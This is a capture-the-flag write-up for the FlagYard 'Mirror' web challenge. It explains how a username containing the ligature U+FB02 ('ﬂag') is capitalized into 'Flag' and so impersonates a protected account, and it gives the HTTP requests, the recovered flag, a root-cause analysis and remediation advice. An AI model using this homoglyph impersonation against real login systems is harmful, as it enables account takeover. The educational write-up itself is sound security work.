# 🪞 Mirror — FlagYard Training Labs (Medium Web)

> **Platform:** FlagYard Training Labs
> **Challenge:** Mirror — "I look in the mirror but don't know who I am"
> **Author:** SAFCSP · **Category:** Web · **Difficulty:** Medium
> **Target Instance:** `http://k725e76b27717474b73976e5483536571.playat.flagyard.com`
> **Final Flag:** `FlagY{a465936087fffb0eac1029fc61064d48}`
> **Solved by:** Fares Badaj (@ptok3)

---

## 📌 Overview

A Flask **"Human Resource System"**:

| Endpoint | Method | Notes |
|---|---|---|
| `/login` | GET/POST | `{username, password}`, form-encoded → session cookie |
| `/sign_up` | GET/POST | `{username, password}` → 302 `/login` on success |
| `/account` | GET | session-gated; shows the secret **only when `user == 'Flag'`** |
| `/logout` | GET | clears the session |

The relevant server logic:

```python
db.execute('insert into users values ("flag", "219c...")')   # seeded flag account

# login
session['user'] = logged_in['username'].capitalize()          # ← the magic line

# account
if user == 'Flag':
    return render_template('account.html', user=user, secret=open('flag.txt').read())
```

The secret is rendered only if the *current* `user` equals `Flag`. The account
`flag` already exists (lowercase, unknown md5 password) so a normal
registration of "the flag user" is impossible. The answer to "who am I?" is a
**homoglyph**: a username that *isn't* `flag` but gets **capitalized** into
`Flag`.

---

## 🔍 1) Recon

* `GET /` → login form; `GET /sign_up` → registration form with the same two fields.
* `POST /sign_up` with a normal name → `302 → /login`; `POST /login` → `302 → /account` + a signed `session` cookie.
* The seeded row is `flag` with an unknown password (`# Believe me, this can't be cracked!`).
* `sign_up` stores **`lower(username)`**, so a duplicate/ASCII-variant of `flag` is rejected by the `PRIMARY KEY`.
* Cookie internals (Flask signed cookie, base64 payload):

  ```text
  eyJ1c2VyIjoiU2FhZDEyMzQifQ == {"user":"Saad1234"}
  ```

  The username travels inside the session **after `.capitalize()`** — and that's what `/account` compares against `'Flag'`.

---

## 🎯 2) Exploitation — homoglyph username

The trick lives in Unicode **titlecase**. Python's `str.capitalize()`
titlecases its first character, and the ligature *LATIN SMALL LIGATURE FL*
`ﬂ` (U+FB02) has a special titlecase mapping of **`Fl`**:

```python
>>> '\ufb02'.capitalize()          # 'ﬂ' alone
'Fl'
>>> ('\ufb02' + 'ag').capitalize() # 'ﬂag' -> 'Fl' + 'ag'
'Flag'
>>> ('\ufb02' + 'ag').capitalize() == 'Flag'
True
```

Meanwhile SQLite's `lower()` (in the C locale) is **ASCII-only**, so `ﬂag`
survives both the sign-up uniqueness check and the login comparison as itself.
Put it together:

1. `sign_up` stores `lower('ﬂag')` = `ﬂag` (new row, no clash with `flag`).
2. `login` matches `WHERE username=lower('ﬂag') AND password=md5(p)`.
3. `session['user'] = 'ﬂag'.capitalize()` = **`Flag`**.
4. `/account` sees `user == 'Flag'` → serves `flag.txt`.

### Step 1 — Register a new user named `ﬂag`

```http
POST /sign_up
Content-Type: application/x-www-form-urlencoded

username=%EF%AC%82ag&password=whatever     // %EF%AC%82 = U+FB02 'ﬂ'
→ 302 Location: /login
```

### Step 2 — Log in

```http
POST /login
Content-Type: application/x-www-form-urlencoded

username=%EF%AC%82ag&password=whatever
→ 302 Location: /account
   Set-Cookie: session=eyJ1c2VyIjoiRmxhZyJ9...    // {"user":"Flag"}  ← capitalized!
```

### Step 3 — Read the secret

```text
GET /account
Cookie: session=eyJ1c2VyIjoiRmxhZyJ9...

→ "Hi Flag, here is your secret: FlagY{a465936087fffb0eac1029fc61064d48}"
```

**🏁 FLAG RECOVERED:** `FlagY{a465936087fffb0eac1029fc61064d48}`

The full automation is in [`solve_mirror.py`](./solve_mirror.py) (single command → homoglyph registration → login → `/account` → `flag_from_mirror.txt`).

---

## 🔬 3) Root Cause Analysis

1. **Sensitive gate on a display string** — `/account` trusts `session['user']` (derived from our form input and cosmetic `capitalize()`) and renders `flag.txt` when it equals `'Flag'`; nothing ties that string back to a *proven identity*.
2. **Insufficient Unicode canonicalization** — the input path uses **ASCII-only** `lower()` (SQLite default) for identity/uniqueness but **full-Unicode** `capitalize()`/titlecase later; the ligature `ﬂ` → `Fl` mapping let a *visually identical* string impersonate the `flag` account across the two differently-normalized boundaries.
3. **No character whitelist** — registration accepts non-ASCII confusable/ligature code points, so U+FB02 sails through `sign_up` untouched.

---

## 🛠️ 4) Remediation

* **Never gate the flag on a display string** — identify the user by a session ID / numeric id, not by a stored `username` that a client supplied and later echoes.
* **Normalize once, compare the same way everywhere**: identity/uniqueness uses ASCII `lower()`, the authorization gate uses Unicode `capitalize()` — two different "normal" forms of the same string defeat each other. Canonicalize to one folded form (e.g. `casefold()`) *before* both storage and the `Flag` check.
* **Whitelist characters** for usernames (ASCII letters/digits/underscore) and reject confusable/ligature code points; optionally run a confusable-detection (e.g. ICU `uspoof_check`).
* Reserve internal admin accounts and make the flag endpoint also verify the account was *seeded*, not created by sign-up.

---

## 💡 5) Practical Takeaways

* **"It looks like the admin username" is sometimes all you need.** Unicode homoglyphs / ligatures (`ﬂ`, `ﬁ`, `ﬀ`, fullwidth letters, `account` vs `accont`-style spoofing) are the classic username-impersonation cheat; check what the app folds before deployment.
* **Sign your own session but still verify authority.** A signed cookie only proves *we* made the cookie; `/account` mistook "we chose a lookalike name" for "we are the flag user".
* **`capitalize()` uses *titlecase*, not ASCII casing** — the ligature `ﬂ` titlecases to `Fl` (Python-wise), which is exactly the kind of Unicode surprise that turns `ﬂag` into `Flag`.

---

## 👑 Credits

Made with ❤ by **Fares Badaj** — Red Team Operator | Penetration Tester Specialist

- Telegram: [@ptok3](https://t.me/ptok3)
- GitHub: [github.com/FaresBadaj](https://github.com/FaresBadaj)
- LinkedIn: [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj)
- Credly: [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

*Technique reference: Bilal Safdar (an0nbil) — "FlagYard Mirror Web Challenge" (register the homoglyph `ﬂag`, log in, `/account` prints the secret). Confirmed on the live instance above; flag value matches the reference.*